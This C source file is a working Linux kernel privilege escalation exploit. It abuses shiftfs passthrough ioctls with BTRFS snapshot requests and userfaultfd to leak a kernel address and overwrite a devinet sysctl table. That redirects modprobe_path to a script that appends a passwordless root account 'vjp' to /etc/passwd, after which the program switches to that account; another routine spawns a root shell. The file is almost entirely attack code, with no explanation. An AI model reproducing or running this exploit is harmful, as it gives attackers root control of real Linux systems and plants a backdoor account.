#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>

#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/shm.h>

#include <linux/btrfs.h>
#include <linux/userfaultfd.h>
#include <linux/sysctl.h>

#include "userfault.h"
#include "ipv4.h"

#define DEBUG
#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)
#define WAIT()                                      \
    do                                              \
    {                                               \
        write(STDERR_FILENO, "[WAITING...]\n", 14); \
        getchar();                                  \
    } while (0)

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define SHIFTFS_PASSTHROUGH_NONE 0
#define SHIFTFS_PASSTHROUGH_STAT 1
#define SHIFTFS_PASSTHROUGH_IOCTL 2
#define SHIFTFS_PASSTHROUGH_ALL \
    (SHIFTFS_PASSTHROUGH_STAT | SHIFTFS_PASSTHROUGH_IOCTL)

#define bash() execl("/bin/bash", "bash", "-i", NULL)
#define touch(filename) close(open(filename, O_WRONLY | O_CREAT | O_NOCTTY | O_NONBLOCK, 0666))

#define ARR_SIZE(arr) sizeof(arr) / sizeof(arr[0])

#define asm __asm__

static inline void panic(const char *msg)
{
    perror(msg);
    exit(1);
}

int org_fd, target_fd;

void dropShell()
{
    __asm__("mov rsp, [rip+save_sp]");
    __asm__("mov rbp, rsp");
    __asm__("add rbp, 0x80");

    if (getuid())
    {
        errExit("NO ROOT");
    }
    logOK("Rooted!");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve(argv[0], argv, envp);
}

void static pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

pid_t newnet_tid;

void alloc_4k()
{
    logInfo("Creating new NETNS...");

    if (unshare(CLONE_NEWNET) != 0)
    {
        panic("unshare(CLONE_NEWNET)");
    }

    newnet_tid = gettid();
    if (newnet_tid == -1)
    {
        panic("alloc4k::gettid");
    }

    logInfo("NEWNET's tid = %d", newnet_tid);
}

/* ---------- kmalloc-4k stuff --------------*/

/*
user@syzkaller:~$ sudo cat /sys/kernel/slab/kmalloc-4k/objs_per_slab
8
user@syzkaller:~$ sudo cat /sys/kernel/slab/kmalloc-4k/cpu_partial
2
*/

#define KMALLOC4K_objsPerSlab 8
#define KMALLOC4K_cpuPartial 2

#define MSGMSG_HEADER_SIZE 0x30UL
#define DATALEN_MSG (PAGE_SIZE - MSGMSG_HEADER_SIZE)
#define TARGET_SIZE 4096


int overflow_objs[KMALLOC4K_objsPerSlab * (KMALLOC4K_cpuPartial + 1)];

/* ---------- End -------------- */

uintptr_t kbase;

#define modprobe_path kbase + 23477184

void overwite_devinet_sysctl_table()
{
    struct devinet_sysctl_table *toWrite_table = (struct devinet_sysctl_table *)(userfaultArg.uf_page + 1);

    toWrite_table->devinet_vars[2].mode = 0666;
    toWrite_table->devinet_vars[2].maxlen = 0x30;
    toWrite_table->devinet_vars[2].extra1 = 0;
    toWrite_table->devinet_vars[2].extra2 = 0;

    toWrite_table->devinet_vars[2].data = (void *)modprobe_path;

    toWrite_table->devinet_vars[2].proc_handler = (void (*)())(kbase + 0xa4680); // proc_doulongvec_minmax
}

int get_new_netns(void)
{
    int fd_netns;
    char netns_file[1025];

    snprintf(netns_file, 1024, "/proc/%d/ns/net", newnet_tid);

    fd_netns = open(netns_file, O_RDONLY);
    logInfo("Namespace NET fd = %d", fd_netns);

    return fd_netns;
}

int enter_netns(int fd_netns)
{
    int ret;
    ret = setns(fd_netns, CLONE_NEWNET);
    logInfo("Setns returned %d", ret);
    return ret;
}

int main(int argc, char **argv, char **envp)
{
    pin_cpu(0);

    rmdir("d1");
    rmdir("d2");

    int x_file = open("/tmp/x", O_WRONLY | O_CREAT | O_NOCTTY | O_NONBLOCK, 0777);
    write(x_file, (""
                   "#!/bin/sh\n"
                   "echo 'vjp::0:0:root:/root:/bin/bash' >> /etc/passwd\n"),
          63);
    close(x_file);

    int trigger_file = open("/tmp/trigger", O_WRONLY | O_CREAT | O_NOCTTY | O_NONBLOCK, 0777);
    write(trigger_file, "\xff\xff\xff\xff", 4);
    close(trigger_file);

    if (mkdir("d1", S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IROTH) == -1)
    {
        panic("mkdir(d1)");
    }

    if (mkdir("d2", S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IROTH) == -1)
    {
        panic("mkdir(d2)");
    }

    logInfo("Created d1 d2");

    int pid = fork();
    if (pid == 0)
    {
        unshare(CLONE_NEWUSER);

        int fd;

        save_sp = &fd;

        fd = open("/proc/self/uid_map", O_WRONLY);
        write(fd, "0 1000 1", 8);
        close(fd);

        fd = open("/proc/self/setgroups", O_WRONLY);
        write(fd, "deny", 4);
        close(fd);

        fd = open("/proc/self/gid_map", O_WRONLY);
        write(fd, "0 1000 1", 8);
        close(fd);

        logInfo("unshare CLONE_NEWUSER");

        unshare(CLONE_NEWNS);

        logInfo("unshare CLONE_NEWNS");

        if (mount("none", "d1", "tmpfs", 0, NULL) == -1)
        {
            panic("mount -t tmpfs none d1");
        }

        logInfo("Mounted d1 --tmpfs-> none");

        if (mount("d1", "d2", "shiftfs", 0, "mark,passthrough=2") == -1)
        {
            panic("mount -t shiftfs -o mark,passthrough=2 d1 d2");
        }

        logInfo("Mounted d2 --shiftfs-> d1");

        touch("d1/file");

        target_fd = open("d2/file", O_RDONLY);
        if (target_fd == -1)
        {
            panic("open(d2/file)");
        }

        struct btrfs_ioctl_vol_args *mem = (void *)0x1337001ULL;
        createThreadUserFault(0x1337000ULL, 2, alloc_4k);

        set_page_wp(userfaultArg.uf_page + PAGE_SIZE, true);

        usleep(1000);

        mem->fd = target_fd;
        ioctl(target_fd, BTRFS_IOC_SNAP_CREATE, mem);

        uint64_t *leak = (uint64_t *)mem;

        devinet_sysctl_forward = leak[5];

        logInfo("devinet_sysctl_forward = %p", (void *)devinet_sysctl_forward);

        kbase = devinet_sysctl_forward - 0xa61f80;
        set_memory_x = kbase + 0x83ef0;
        nice_gadget = kbase + 0x64160a;

        usleep(1000);
        overwite_devinet_sysctl_table();
        usleep(1000);

        for (uint64_t i = 0; i < ARR_SIZE(overflow_objs); ++i)
        {
            ioctl(target_fd, BTRFS_IOC_SNAP_CREATE, mem);
        }

        int fd_netns = get_new_netns();

        enter_netns(fd_netns);

        // usleep(1000);

        int fd0 = open("/proc/sys/net/ipv4/conf/all/bc_forwarding", O_TRUNC | O_WRONLY);
        if (fd0 == -1)
        {
            panic("open(/proc/sys/net/ipv4/conf/all/bc_forwarding)");
        }

        char buf[0x100];

        uint64_t *modprobe_fake = (uint64_t *)"/tmp/x\0\0\0\0";

        snprintf(buf, 0xff, "%lu %lu ", modprobe_fake[0], modprobe_fake[1]);

        write(fd0, buf, 0x100);

        system("/tmp/trigger");

        usleep(100);
    }

    wait(NULL);
    system("su vjp");
}